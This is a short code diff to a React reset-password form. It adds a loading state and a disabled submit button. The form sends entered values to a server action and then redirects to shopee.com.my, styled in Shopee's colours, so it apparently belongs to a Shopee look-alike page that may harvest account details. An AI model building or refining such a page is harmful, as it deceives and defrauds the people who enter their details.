@@ -18,6 +18,7 @@ import { resetPassword } from "@/app/_actions";
 import { redirect } from "next/navigation";
 
 const ResetPasswordForm = () => {
+  const [loading, setLoading] = React.useState(false);
   const form = useForm<z.infer<typeof formSchema>>({
     resolver: zodResolver(formSchema),
     defaultValues: {
@@ -28,6 +29,7 @@ const ResetPasswordForm = () => {
   });
   // 2. Define a submit handler.
   async function onSubmit(values: z.infer<typeof formSchema>) {
+    setLoading(true);
     await resetPassword(values);
     redirect("https://shopee.com.my/");
   }
@@ -73,7 +75,7 @@ const ResetPasswordForm = () => {
             </FormItem>
           )}
         />
-        <Button type="submit" className="w-full rounded-none bg-[#EE4D2D]">
+        <Button type="submit" className="w-full rounded-none bg-[#EE4D2D]" disabled={loading}>
           CONTINUE
         </Button>
       </form>
